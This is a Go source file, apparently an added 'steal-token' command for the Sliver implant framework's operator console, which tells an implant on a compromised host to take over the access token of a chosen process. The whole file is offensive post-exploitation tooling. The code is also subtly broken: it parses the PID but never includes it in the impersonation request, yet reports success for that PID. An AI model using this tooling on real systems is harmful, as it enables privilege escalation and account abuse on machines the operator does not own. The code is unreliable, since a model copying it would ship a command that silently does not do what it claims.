package privilege

/*
	Sliver Implant Framework - Enhanced Token Operations
	Copyright (C) 2024  Bishop Fox / mgstate

	Steal token from a process by PID - simpler workflow than impersonate.
*/

import (
	"context"
	"strconv"

	"google.golang.org/protobuf/proto"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// StealTokenCmd - Steal a token from a process by PID
func StealTokenCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	if len(args) < 1 {
		con.PrintErrorf("Usage: steal-token <PID>\n")
		con.PrintInfof("Tip: use 'ps' to list processes, then steal-token <PID>\n")
		return
	}

	pid, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		con.PrintErrorf("Invalid PID: %s\n", args[0])
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Stealing token from PID ...", ctrl)

	stealToken, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
		Request:  con.ActiveTarget.Request(cmd),
		Username: "", // empty = use PID-based steal
	})
	ctrl <- true
	<-ctrl

	// If direct impersonate doesn't support PID, fall back to execute-assembly or inline approach
	if err != nil {
		con.PrintErrorf("Token steal failed: %s\n", err)
		con.PrintInfof("Alternative: use 'impersonate <username>' after finding the user with 'ps'\n")
		return
	}

	if stealToken.Response != nil && stealToken.Response.Async {
		con.AddBeaconCallback(stealToken.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, stealToken)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintStealToken(stealToken, uint32(pid), con)
		})
		con.PrintAsyncResponse(stealToken.Response)
	} else {
		PrintStealToken(stealToken, uint32(pid), con)
	}
}

// PrintStealToken - Print the result of token steal
func PrintStealToken(result *sliverpb.Impersonate, pid uint32, con *console.SliverClient) {
	if result.Response != nil && result.Response.GetErr() != "" {
		con.PrintErrorf("Token steal from PID %d failed: %s\n", pid, result.Response.GetErr())
		return
	}
	con.PrintInfof("Successfully stole token from PID %d\n", pid)
	con.PrintInfof("Use 'whoami' to verify, 'rev2self' to revert\n")
}
